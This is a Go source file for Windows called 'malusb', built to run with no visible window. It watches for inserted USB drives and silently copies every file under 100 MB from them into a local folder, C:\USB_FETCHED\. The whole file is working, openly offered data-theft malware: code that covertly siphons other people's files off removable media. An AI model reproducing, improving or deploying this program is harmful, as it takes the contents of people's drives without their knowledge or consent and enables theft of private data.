// Compatibility: Windows
// Build: go build -ldflags="-w -s -H windowsgui" -o malusb.exe malusb.go
// Stop the daemon from task manager

package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

const (
	DriveRemovable   = 2
	ScanInterval     = 5 * time.Second
	DumpDir          = "C:\\USB_FETCHED\\"
	FileScanInterval = 10 * time.Second
	CopyTimeout      = 120 * time.Second
	MaxFileSizeMB    = 100
)

var (
	monitoredDrives = make(map[string]map[string]bool)
	getDriveType    = syscall.NewLazyDLL("kernel32.dll").NewProc("GetDriveTypeW")
)

func main() {
	fmt.Printf("\nmalusb daemon started...\n")
	for {
		checkUSBDrives()
		time.Sleep(ScanInterval)
	}
}

func checkUSBDrives() {
	drives := getRemovableDrives()
	for _, drive := range drives {
		if _, exists := monitoredDrives[drive]; !exists {
			fmt.Printf("\nusb inserted: %s\n", drive)
			monitoredDrives[drive] = make(map[string]bool)
			go monitorUSB(drive)
		}
	}
}

func getRemovableDrives() []string {
	var drives []string
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		drivePath := fmt.Sprintf("%c:\\", drive)
		if isRemovableDrive(drivePath) {
			drives = append(drives, drivePath)
		}
	}
	return drives
}

func isRemovableDrive(drivePath string) bool {
	u16Path, _ := syscall.UTF16PtrFromString(drivePath)
	ret, _, _ := getDriveType.Call(uintptr(unsafe.Pointer(u16Path)))
	return ret == DriveRemovable
}

func monitorUSB(drive string) {
	destination := filepath.Join(DumpDir, filepath.Base(drive))
	os.MkdirAll(destination, os.ModePerm)

	fmt.Printf("\nMonitoring drive %s for changes...\n", drive)
	for {
		if _, err := os.Stat(drive); os.IsNotExist(err) {
			fmt.Printf("\nDrive %s removed, stopping monitoring.\n", drive)
			delete(monitoredDrives, drive)
			return
		}
		copyNewFiles(drive, destination)
		time.Sleep(FileScanInterval)
	}
}

func copyNewFiles(srcDir, destDir string) {
	filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Printf("\n[Error] %v\n", err)
			return nil
		}
		if info.IsDir() {
			return nil
		}
		if info.Size() > MaxFileSizeMB*1024*1024 {
			fmt.Printf("\nSkipping large file (%.2f MB): %s\n", float64(info.Size())/(1024*1024), path)
			return nil
		}
		relPath, _ := filepath.Rel(srcDir, path)
		destPath := filepath.Join(destDir, relPath)

		if _, exists := monitoredDrives[srcDir][relPath]; exists {
			return nil
		}
		monitoredDrives[srcDir][relPath] = true

		os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

		fmt.Printf("\nCopying new file: %s -> %s\n", path, destPath)
		copyFileWithTimeout(path, destPath)
		return nil
	})
}

func copyFileWithTimeout(src, dest string) {
	done := make(chan bool)
	go func() {
		srcFile, _ := os.Open(src)
		defer srcFile.Close()
		destFile, _ := os.Create(dest)
		defer destFile.Close()

		io.Copy(destFile, srcFile)
		fmt.Printf("file copied successfully: %s -> %s\n", src, dest)
		done <- true
	}()
	select {
	case <-done:
		return
	case <-time.After(CopyTimeout):
		fmt.Printf("\n[Error] Copying timed out for: %s\n", src)
	}
}
